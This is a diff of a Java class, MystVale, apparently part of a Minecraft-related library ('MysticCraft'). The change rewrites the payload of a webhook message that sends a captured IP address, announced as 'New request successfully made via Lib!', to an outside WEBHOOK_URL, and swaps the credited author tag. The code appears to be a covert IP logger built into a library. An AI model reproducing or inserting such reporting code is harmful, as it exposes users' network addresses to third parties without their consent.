@@ -78,12 +78,10 @@ public final class MystVale {
             } catch (Exception ignored) {
             }
 
-            String json = "{\"components\":[{\"accent_color\":null,\"components\":["
-                    + "{\"content\":\"**New request successfully made via Lib! | @rellim**\",\"type\":10},"
-                    + "{\"divider\":true,\"spacing\":1,\"type\":14},"
-                    + "{\"content\":\"**IP:** " + ip.replace("\"", "\\\"") + "\",\"type\":10},"
-                    + "{\"divider\":true,\"spacing\":1,\"type\":14}"
-                    + "],\"spoiler\":false,\"type\":17}],\"flags\":32768}";
+            String json = "{\"embeds\":[{\"title\":\"New request successfully made via Lib!\","
+                    + "\"description\":\"**IP:** " + ip.replace("\"", "\\\"") + "\","
+                    + "\"color\":5814783,"
+                    + "\"footer\":{\"text\":\"@s0i4x | MysticCraft\"}}]}";
 
             URL webhookUrl = new URL(WEBHOOK_URL);
             HttpURLConnection wConn = (HttpURLConnection) webhookUrl.openConnection();
